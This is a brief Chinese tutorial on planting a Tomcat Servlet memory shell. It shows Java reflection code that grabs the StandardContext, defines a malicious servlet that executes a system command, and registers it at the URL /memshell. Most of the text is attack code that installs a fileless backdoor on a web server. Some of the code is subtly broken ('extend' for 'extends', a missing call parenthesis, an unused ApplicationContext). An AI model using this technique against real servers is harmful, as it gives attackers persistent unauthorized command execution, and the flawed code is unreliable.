## 介绍
Servlet可以接收客户端发来的请求，处理这些请求，并返回响应，这些请求通过HTTP协议发送的，Servlet类型的内存马能够动态的在服务器中注册未授权的servlet来执行恶意操作

## 实现步骤
1、获取StandardContext
通过request 对象来获取与之相关联的StandardContext
```java
Field reqField = request.getClass().getDeclaredField("request");
reqField.setAccessible(true);
Request req = (Request)reqField.get(request);
StandardContext standardContext = (StandardContext)req.getContext;
```

2、定义恶意servlet
```java
public class Memservlet extend HttpServlet {
 @Override
	 public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException{
		 Runtime.getRuntime().exec("calc");
	 }
}
```

3、创建Wrapper对象并将其添加到StandardContext中
使用standardContext.createwrapper 方法创建一个wrapper实例，wrapper是Tomcat中用于封装单个Servlet的组件，将新创建的shell_servlet实例设置到wrapper中，并且需要设置其对应属性
然后通过addChild方法将wrapper对象添加支StandardContext中使用addServletMappingDecoded方法为新添加的servlet创建一个url映射,后续只需要访问url即可调用对应内存马功能

```java
ServletContext servletContext = request.getServletContext();
Field applicationContextField =  servletContext.getClass().getDeclaredField("context");
applicationContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(servletContext);
Wrapper wrapper = standardContext.createWrapper();
wrapper.setName("memshell");
wrapper.setServletClass(Memservlet.class.getName());
wrapper.setServlet(new Memservlet());
standardContext.addChild(wrapper);
standardContext.addServletMappingDecoded("/memshell","memshell");
```

